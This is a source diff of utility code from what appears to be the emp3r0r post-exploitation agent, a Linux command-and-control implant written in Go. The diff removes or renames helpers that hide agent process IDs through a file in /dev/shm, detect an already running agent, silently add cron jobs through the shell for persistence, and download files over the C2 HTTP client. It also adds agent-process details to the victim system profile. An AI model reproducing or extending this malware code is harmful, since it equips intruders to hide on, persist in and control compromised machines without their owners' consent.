@@ -10,99 +10,17 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
-	"math/rand"
 	"net"
 	"net/http"
 	"os"
-	"os/exec"
 	"os/user"
 	"strconv"
 	"strings"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	gops "github.com/mitchellh/go-ps"
 	"github.com/zcalusic/sysinfo"
 )
-
-// IsCommandExist check if an executable is in $PATH
-func IsCommandExist(exe string) bool {
-	_, err := exec.LookPath(exe)
-	return err == nil
-}
-
-// IsProcAlive check if a process name exists, returns its PID
-func IsProcAlive(procName string) (alive bool, procs []*os.Process) {
-	allprocs, err := gops.Processes()
-	if err != nil {
-		log.Println(err)
-		return
-	}
-
-	for _, p := range allprocs {
-		if p.Executable() == procName {
-			alive = true
-			proc, err := os.FindProcess(p.Pid())
-			if err != nil {
-				log.Println(err)
-			}
-			procs = append(procs, proc)
-		}
-	}
-
-	return
-}
-
-// IsFileExist check if a file exists
-func IsFileExist(path string) bool {
-	if _, err := os.Stat(path); os.IsNotExist(err) {
-		return false
-	}
-	return true
-}
-
-// RemoveDupsFromArray remove duplicated items from string slice
-func RemoveDupsFromArray(array []string) (result []string) {
-	m := make(map[string]bool)
-	for _, item := range array {
-		if _, ok := m[item]; !ok {
-			m[item] = true
-		}
-	}
-
-	for item := range m {
-		result = append(result, item)
-	}
-	return result
-}
-
-// UpdateHIDE_PIDS update HIDE PID list
-func UpdateHIDE_PIDS() error {
-	HIDE_PIDS = RemoveDupsFromArray(HIDE_PIDS)
-	return ioutil.WriteFile("/dev/shm/emp3r0r_pids", []byte(strings.Join(HIDE_PIDS, "\n")), 0600)
-}
-
-// IsAgentRunningPID is there any emp3r0r agent already running?
-func IsAgentRunningPID() (bool, int) {
-	defer func() {
-		myPIDText := strconv.Itoa(os.Getpid())
-		if err := ioutil.WriteFile(PIDFile, []byte(myPIDText), 0600); err != nil {
-			log.Printf("Write PIDFile: %v", err)
-		}
-	}()
-
-	pidBytes, err := ioutil.ReadFile(PIDFile)
-	if err != nil {
-		return false, -1
-	}
-	pid, err := strconv.Atoi(string(pidBytes))
-	if err != nil {
-		return false, -1
-	}
-
-	_, err = os.FindProcess(pid)
-	return err == nil, pid
-}
 
 // is the agent alive?
 // connect to SocketName, send a message, see if we get a reply
@@ -158,14 +76,8 @@ func Send2CC(data *MsgTunData) error {
 	return nil
 }
 
-// RandInt random int between given interval
-func RandInt(min, max int) int {
-	seed := rand.NewSource(time.Now().UTC().Unix())
-	return min + rand.New(seed).Intn(max-min)
-}
-
-// Download download via EmpHTTPClient
-func Download(url, path string) (err error) {
+// DownloadViaCC download via EmpHTTPClient
+func DownloadViaCC(url, path string) (err error) {
 	var (
 		resp *http.Response
 		data []byte
@@ -182,29 +94,6 @@ func Download(url, path string) (err error) {
 	}
 
 	return ioutil.WriteFile(path, data, 0600)
-}
-
-// AppendToFile append text to a file
-func AppendToFile(filename string, text string) (err error) {
-	f, err := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
-	if err != nil {
-		return
-	}
-	defer f.Close()
-
-	if _, err = f.WriteString(text); err != nil {
-		return
-	}
-	return
-}
-
-// Copy copy file from src to dst
-func Copy(src, dst string) error {
-	in, err := ioutil.ReadFile(src)
-	if err != nil {
-		return err
-	}
-	return ioutil.WriteFile(dst, in, 0755)
 }
 
 // GetKernelVersion uname -r
@@ -237,6 +126,9 @@ func CollectSystemInfo() *SystemInfo {
 
 	// have root?
 	info.HasRoot = os.Geteuid() == 0
+
+	// process
+	info.Process = CheckAgentProcess()
 
 	// user account info
 	u, err := user.Current()
@@ -286,14 +178,6 @@ func CheckAccount(username string) (accountInfo map[string]string, err error) {
 	}
 
 	return
-}
-
-// AddCronJob add a cron job without terminal
-// this creates a cron job for whoever runs the function
-func AddCronJob(job string) error {
-	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
-	cmd := exec.Command("/bin/sh", "-c", cmdStr)
-	return cmd.Start()
 }
 
 func getMemSize() (size int) {
